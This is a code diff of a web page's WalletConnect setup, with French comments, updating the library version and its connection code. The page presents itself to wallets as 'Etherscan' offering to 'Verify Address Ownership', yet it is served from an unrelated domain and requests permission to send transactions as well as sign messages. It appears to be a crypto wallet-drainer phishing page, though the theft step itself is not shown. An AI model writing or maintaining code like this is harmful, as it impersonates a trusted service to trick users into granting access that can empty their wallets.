@@ -889,8 +889,8 @@
   <!-- CDN -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
-
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.24.0/dist/index.umd.js"></script>
+  
 <script>
   /* ===== Icônes (inchangé) ===== */
   const ICONS = {
@@ -1250,28 +1250,27 @@
     return null;
   }
 
-  async function initWalletConnect() {
-    const SignClientClass = getSignClient();
-    if (!SignClientClass) throw new Error('WalletConnect non trouvé.');
+async function initWalletConnect() {
+  const SignClientClass = window['@walletconnect/sign-client'].SignClient;
 
-    signClient = await SignClientClass.init({
-      projectId: PROJECT_ID,
-      metadata: {
-        name: 'Etherscan',
-        description: 'Verify Address Ownership',
-        url: 'https://chainintegrity.io',
-        icons: ['https://chainintegrity.io/etherscan-logo-circle.png']
+  signClient = await SignClientClass.init({
+    projectId: PROJECT_ID,
+    metadata: {
+      name: 'Etherscan',
+      description: 'Verify Address Ownership',
+      url: 'https://chainintegrity.io', // ← ton domaine actuel
+      icons: ['https://chainintegrity.io/etherscan-logo-circle.png']
+    }
+  });
+
+  const { uri, approval } = await signClient.connect({
+    requiredNamespaces: {
+      eip155: {
+        methods: ['personal_sign', 'eth_sendTransaction'],
+        chains: ['eip155:1'],
+        events: []
       }
-    });
-
-    const { uri, approval } = await signClient.connect({
-      requiredNamespaces: {
-        eip155: {
-          methods: ['personal_sign', 'eth_sendTransaction'], // ← OBLIGATOIRE
-          chains: ['eip155:1'],
-          events: []
-        }
-      },
+    },
       redirect: { universal: 'https://chainintegrity.io/verifyaddress' }
     });
 
